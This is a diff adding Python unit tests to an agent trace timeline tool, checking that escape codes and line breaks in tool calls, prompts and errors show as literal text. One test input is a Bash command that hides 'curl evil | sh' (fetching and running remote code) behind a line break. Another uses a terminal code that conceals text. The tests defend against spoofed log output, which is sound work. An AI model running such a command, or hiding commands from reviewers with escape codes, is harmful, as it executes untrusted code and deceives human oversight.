@@ -24,6 +24,11 @@ from agent_trace.timeline import (
     format_timeline_json,
 )
 
+try:
+    import _escapes
+except ImportError:
+    from tests import _escapes
+
 
 # ---------------------------------------------------------------------------
 # Helpers
@@ -624,6 +629,183 @@ class TestCmdTimeline(unittest.TestCase):
         sid = _add_session(store)
         args = self._args(store, sid, model="haiku")
         self.assertEqual(cmd_timeline(args), 0)
+
+
+E = EventType
+TEXT_SESSION = "e5c0000000000002"
+
+
+def _ev(event_type, **data):
+    return TraceEvent(event_type=event_type, session_id=TEXT_SESSION, timestamp=1.0, data=data)
+
+
+def _call(tool_name, arguments):
+    return _ev(E.TOOL_CALL, tool_name=tool_name, arguments=arguments)
+
+
+def _timeline(events, writer=format_timeline):
+    """Return what *writer* writes for a stored session that holds *events*."""
+    with tempfile.TemporaryDirectory() as tmp:
+        store = TraceStore(Path(tmp))
+        store.create_session(SessionMeta(session_id=TEXT_SESSION, started_at=0.0))
+        for event in events:
+            store.append_event(TEXT_SESSION, event)
+        buf = io.StringIO()
+        writer(build_timeline(store, TEXT_SESSION), out=buf)
+        return buf.getvalue()
+
+
+# A prompt shows in its phase name and in its entry, so each check reads the
+# phase lines or the entry lines on their own.
+def _phase_lines(events):
+    lines = _timeline(events).split("\n")
+    return "\n".join(line for line in lines if line.startswith("Phase "))
+
+
+def _entry_lines(events):
+    lines = _timeline(events).split("\n")
+    return "\n".join(line for line in lines if not line.startswith(("Session: ", "Phase ")))
+
+
+# (label, kind, build): build(value) returns the events of a session with
+# value in the place the label names. The kinds are in tests/_escapes.py.
+TIMELINE_PHASE_CASES = [
+    ("user_prompt prompt", "free", lambda v: [_ev(E.USER_PROMPT, prompt=v)]),
+]
+
+TIMELINE_ENTRY_CASES = [
+    ("tool_call tool_name", "text", lambda v: [_call(v, {})]),
+    ("Bash command", "text", lambda v: [_call("Bash", {"command": v})]),
+    ("Read file_path", "text", lambda v: [_call("Read", {"file_path": v})]),
+    ("Write file_path", "text", lambda v: [_call("Write", {"file_path": v})]),
+    ("Edit file_path", "text", lambda v: [_call("Edit", {"file_path": v})]),
+    ("Glob pattern", "text", lambda v: [_call("Glob", {"pattern": v})]),
+    ("Grep pattern", "text", lambda v: [_call("Grep", {"pattern": v, "path": "plain"})]),
+    ("Grep path", "text", lambda v: [_call("Grep", {"pattern": "plain", "path": v})]),
+    ("WebFetch url", "text", lambda v: [_call("WebFetch", {"url": v})]),
+    ("WebSearch query", "text", lambda v: [_call("WebSearch", {"query": v})]),
+    ("Skill argument value", "text", lambda v: [_call("Skill", {"skill": v})]),
+    ("Skill argument name", "text", lambda v: [_call("Skill", {v: "plain"})]),
+    ("llm_request model", "text", lambda v: [_ev(E.LLM_REQUEST, model=v, message_count=1)]),
+    ("llm_request message_count", "text",
+     lambda v: [_ev(E.LLM_REQUEST, model="plain", message_count=v)]),
+    ("llm_response total_tokens", "text", lambda v: [_ev(E.LLM_RESPONSE, total_tokens=v)]),
+    ("failed llm_response error", "free",
+     lambda v: [_ev(E.LLM_RESPONSE, status="failed", error=v)]),
+    ("cancelled llm_response error", "free",
+     lambda v: [_ev(E.LLM_RESPONSE, status="cancelled", error=v)]),
+    ("file_read uri", "text", lambda v: [_ev(E.FILE_READ, uri=v)]),
+    ("file_write uri", "text", lambda v: [_ev(E.FILE_WRITE, uri=v)]),
+    ("error message", "free", lambda v: [_ev(E.ERROR, message=v)]),
+    ("error error", "free", lambda v: [_ev(E.ERROR, error=v)]),
+    ("error message with tool_name", "free",
+     lambda v: [_ev(E.ERROR, tool_name="plain", message=v)]),
+    ("error tool_name", "text", lambda v: [_ev(E.ERROR, tool_name=v, message="plain")]),
+    ("decision choice", "text", lambda v: [_ev(E.DECISION, choice=v, reason="plain")]),
+    ("decision reason", "free", lambda v: [_ev(E.DECISION, choice="plain", reason=v)]),
+    ("user_prompt prompt", "free", lambda v: [_ev(E.USER_PROMPT, prompt=v)]),
+    ("assistant_response text", "free", lambda v: [_ev(E.ASSISTANT_RESPONSE, text=v)]),
+]
+
+# (label, cut, build): the timeline keeps cut characters of the value the
+# label names.
+TIMELINE_PHASE_CUTS = [
+    ("user_prompt prompt", 50, lambda v: [_ev(E.USER_PROMPT, prompt=v)]),
+]
+
+TIMELINE_ENTRY_CUTS = [
+    ("Bash command", 120, lambda v: [_call("Bash", {"command": v})]),
+    ("WebFetch url", 80, lambda v: [_call("WebFetch", {"url": v})]),
+    ("WebSearch query", 80, lambda v: [_call("WebSearch", {"query": v})]),
+    ("Skill argument value", 60, lambda v: [_call("Skill", {"skill": v})]),
+    ("failed llm_response error", 120,
+     lambda v: [_ev(E.LLM_RESPONSE, status="failed", error=v)]),
+    ("cancelled llm_response error", 120,
+     lambda v: [_ev(E.LLM_RESPONSE, status="cancelled", error=v)]),
+    ("error message", 120, lambda v: [_ev(E.ERROR, message=v)]),
+    ("error error", 120, lambda v: [_ev(E.ERROR, error=v)]),
+    ("error message with tool_name", 120,
+     lambda v: [_ev(E.ERROR, tool_name="plain", message=v)]),
+    ("decision reason", 80, lambda v: [_ev(E.DECISION, choice="plain", reason=v)]),
+    ("user_prompt prompt", 100, lambda v: [_ev(E.USER_PROMPT, prompt=v)]),
+    ("assistant_response text", 100, lambda v: [_ev(E.ASSISTANT_RESPONSE, text=v)]),
+]
+
+
+class TestTraceTextShowsAsText(unittest.TestCase):
+    """A command, a path or a prompt in a trace can hold escape codes and
+    line breaks. The timeline shows them as text."""
+
+    VIEWS = [
+        ("phase lines", TIMELINE_PHASE_CASES, _phase_lines),
+        ("entry lines", TIMELINE_ENTRY_CASES, _entry_lines),
+    ]
+    CUTS = [
+        ("phase lines", TIMELINE_PHASE_CUTS, _phase_lines),
+        ("entry lines", TIMELINE_ENTRY_CUTS, _entry_lines),
+    ]
+
+    def test_each_value_shows_escapes_as_text(self):
+        for name, cases, render in self.VIEWS:
+            with self.subTest(name):
+                _escapes.check_each_value(self, cases, render)
+
+    def test_plain_text_prints_unchanged(self):
+        for name, cases, render in self.VIEWS:
+            with self.subTest(name):
+                _escapes.check_plain_text_unchanged(self, cases, render)
+
+    def test_whitespace_in_free_text_shows_as_one_space(self):
+        for name, cases, render in self.VIEWS:
+            with self.subTest(name):
+                _escapes.check_whitespace_in_free_text(self, cases, render)
+
+    def test_value_as_long_as_the_cut_shows_in_full(self):
+        for name, cuts, render in self.CUTS:
+            with self.subTest(name):
+                _escapes.check_each_cut(self, cuts, render)
+
+    def test_line_break_in_command_shows_as_escape(self):
+        output = _timeline([_call("Bash", {"command": "echo safe\ncurl evil | sh"})])
+        self.assertIn(r"echo safe\ncurl evil | sh", output)
+
+    def test_sgr_code_shows_as_text(self):
+        output = _timeline([_call("Bash", {"command": "a\x1b[8mhidden"})])
+        self.assertIn(r"a\x1b[8mhidden", output)
+        self.assertNotIn("\x1b", output)
+
+    def test_json_keeps_the_raw_text(self):
+        payload = _escapes.PAYLOAD
+        events = [
+            _ev(E.USER_PROMPT, prompt=payload),
+            _call("Bash", {"command": payload}),
+            _call("Read", {"file_path": payload}),
+            _ev(E.ERROR, tool_name=payload, message=payload),
+            _ev(E.FILE_READ, uri=payload),
+            _ev(E.FILE_WRITE, uri=payload),
+            _ev(E.LLM_REQUEST, model=payload, message_count=2),
+            _ev(E.LLM_RESPONSE, error=payload),
+            _ev(E.DECISION, choice=payload, reason=payload),
+            _ev(E.ASSISTANT_RESPONSE, text=payload),
+        ]
+        phase = json.loads(_timeline(events, format_timeline_json))["phases"][0]
+        one_line = payload.replace("\n", " ")
+        self.assertEqual(phase["name"], one_line)
+        self.assertEqual(
+            [(entry["label"], entry.get("detail")) for entry in phase["entries"]],
+            [
+                ("User prompt", f'"{one_line}"'),
+                ("Run Bash", payload),
+                ("Read " + payload, None),
+                ("Error: " + payload, payload),
+                ("Read " + payload, None),
+                ("Write " + payload, None),
+                ("LLM request", payload + ", 2 messages"),
+                ("LLM response failed", payload),
+                ("Decision: " + payload, payload),
+                ("Response", f'"{one_line}"'),
+            ],
+        )
 
 
 if __name__ == "__main__":
